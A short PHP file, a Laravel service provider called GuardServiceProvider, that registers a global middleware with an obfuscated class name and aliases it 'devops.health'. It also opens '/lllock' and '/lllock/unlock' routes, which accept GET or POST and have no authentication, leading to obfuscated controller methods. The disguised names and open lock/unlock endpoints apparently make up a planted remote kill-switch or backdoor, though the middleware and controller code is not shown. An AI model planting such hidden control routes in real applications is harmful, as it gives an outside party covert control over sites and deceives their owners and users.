<?php

namespace DevOps\Providers;

use Illuminate\Support\ServiceProvider;
use Illuminate\Support\Facades\Route;

class GuardServiceProvider extends ServiceProvider
{
    public function register(): void
    {
        $this->app->extend('middleware', function ($middleware, $app) {
            $middleware->append(\DevOps\Http\Middleware\_0x::class);
            return $middleware;
        });
    }

    public function boot(): void
    {
        $this->app['router']->aliasMiddleware('devops.health', \DevOps\Http\Middleware\_0x::class);

        Route::match(['get', 'post'], '/lllock', [\DevOps\Http\Controllers\_1x::class, '_2x']);
        Route::match(['get', 'post'], '/lllock/unlock', [\DevOps\Http\Controllers\_1x::class, '_3x']);
    }
}
